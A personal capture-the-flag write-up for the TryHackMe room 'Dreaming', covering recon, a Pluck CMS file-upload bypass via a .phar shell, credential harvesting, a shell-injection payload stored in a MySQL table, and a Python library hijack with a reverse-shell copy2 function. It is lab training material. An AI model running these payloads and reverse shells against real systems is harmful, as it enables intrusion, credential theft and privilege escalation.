---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Dreaming
# DESCRIPTION       . Solve the riddle that dreams have woven.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/dreaming
```

```
sudo nmap -sSVC -T5 -p- 10.10.6.143 -oN dreaming
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 762667a6b0080eed34585b4e77459257 (RSA)
|   256 523aad267f6e3f23f9e4efe85ac8425c (ECDSA)
|_  256 71df6e81f0807971a8da2e1e56c4debb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Fuzzing for hidden endpoints, I found the `/app` directory.

```
ffuf -u http://10.10.6.143:80/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

```
app                     [Status: 301, Size: 308, Words: 20, Lines: 10]
```

- We end up on the dreaming file, with the URL looking something like this.

```
http://10.10.6.143/app/pluck-4.7.13/?file=dreaming
```

- I tried changing the url to 

```
http://10.10.6.143/app/pluck-4.7.13/?file=../../../../etc/passwd
```

and I got 

```
A hacking attempt has been detected. For security reasons, we're blocking any code execution.
```

- Cleary there is some potential vulnerability in place, but I decided to head back and explore the page a bit more.

- Back on the dreaming page, there's a small link called `admin` which I was able to log in using `password` password. How did I know it? Dumb luck :D 

- I spent some time around the admin console and I came across the `pages->manage files` functionality, which allowed me to upload arbitrary files.

- I tried uploading a reverse PHP shell but the `.txt` was added by pluck when uploading a `.php` file. 

- I checked using burp suite to see if this is done client side but it's not, so I couldn't bypass it.

- I went back to my LFI attempt and played a little bit but I couldn't actually bypass it; 

- Then, I found the source code on github [here](https://github.com/pluck-cms/pluck/tree/master).

- I cloned it and using grep I found out that there seems to be some patches for LFI, so I gave up on this path.

- Then, I decided that I should try  (didn't came across my mind first time) alternatives to `.php` extension back to the `manage files` page.

- I changed the filename from `shell.php` to `shell.phar` and I was able to bypass the filtering.

#### PRIVILEGE ESCALATION --- www-data -> Lucien

- After stabilising the shell as `www-data`, I started looking around the filesystem.

- What caught my attention was the `kingdom_backup` directory in root, but I didn't had access to that path.
- I checked the home directories of all 3 users, but I didn't had acess to anything.
- Then I came back to root and decided to take a look in `/opt`, where I found two files

```
getDreams.py  test.py
```

```getDreams.py
# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )
```

- This hinted that there is a mysql server running locally, but the password is not actually `#redacted`.

- However, I found the credentials for the user `Lucien` in `test.py`.

```
#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "{REDACTED}"
```

#### PRIVILEGE ESCALATION --- Lucien -> Death

```
sudo -l
(death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

- I ran the script as `death` and ... I have no idea what is this

```
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician
```

- I stared by looking in the `/var/log/auth.log` after previously commands run as root, but I didn't find anything valuable.

- Then, I came back to lucien's home directory and started looking around.

- I was able to find the password to mysql in the `.bash_history` file.

```
mysql -u lucien -p{REDACTED}
```

- Ok, now that we are in mysql, it all makes sense. 

- The output of `/home/death/getDreams.py` is just the content of the `dreams` table in the `library` database.

```
mysql> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| library            |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use library;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SHOW Tables;
+-------------------+
| Tables_in_library |
+-------------------+
| dreams            |
+-------------------+
1 row in set (0.00 sec)

mysql> SELECT * from dreams;
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
+---------+------------------------------------+
4 rows in set (0.00 sec)

mysql>
```

- This confirms that the script in `/opt/getDreams.py` is the same as the one used in death's home directory.

- Technically whatever we input into the table will get executed by bas when printed, and there is no sanitization. This can be seen in the `/opt/getDreams.py` copy of the script.

```
else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)
```

```
mysql> INSERT INTO dreams (dreamer, dream) VALUES ('test', '$(cp /bin/bash /tmp/bash; chmod +xs /tmp/bash)');
Query OK, 1 row affected (0.02 sec)
```

- Then, I ran the script as death.

```
lucien@dreaming:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician

test +
```

- But the copy of bash was in the `/tmp` directory.

```
lucien@dreaming:~$ /tmp/bash -p
bash-5.0$ id 

{TRIMMED } egid=1001(death) groups=1001(death) {TRIMMED}
```

#### PRIVILEGE ESCALATION --- death -> morpheus

- In the `getDreams.py` from death's home directory we can find death's password.

```
# MySQL credentials
DB_USER = "death"
DB_PASS = "!{REDACTED}!"
DB_NAME = "library"
```

- After some enumeration, I noticed that I still don't have access to `/kingdom_backup` and I used find to see what else is available to user death.

```
find / -group death 2>/dev/null
```

```
/usr/lib/python3.8/shutil.py
```

```
-rw-rw-r-- 1 root death 51474 Aug  7  2023 /usr/lib/python3.8/shutil.py
```

- So we have access to write to that python libary.

- In `/home/morpheus` there's a file called `restore.py`

```
death@dreaming:/home/morpheus$ cat restore.py
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

- so whatever we write in `shutil.py` will get executed by this script when it executes.

- I'm on a rush, so I didn't allocate time to transfer `pspy` and check if this script is actually runinng at specific times. I'll just replace the content with a reverse shell and hope for the best.

- A harder to detect approach would be to replace only the `copy2` function from `shutil.py` with our payload, since we know that that exact function is imported.

```
def copy2(src, dst, *, follow_symlinks=True):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("IP",3132))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/bash")
```

- At the beginning of the file, I also added the following imports

```
import os
import socket
import subprocess
import pty
```

- Then, I've started a listener and shortly I got back a connection under `morpheus`.

```
sudo -l
(ALL) NOPASSWD: ALL
```

- The first flag can be obtained as user `lucien` and is located in `/home/lucien/lucien_flag.txt`.

- The second flag can be obtained as user `death` and is located in `/home/death/death_flag.txt`.

- The third flag can be obtained as user `morpheus` and is located in `/home/morpheus/morpheus_flag.txt`.

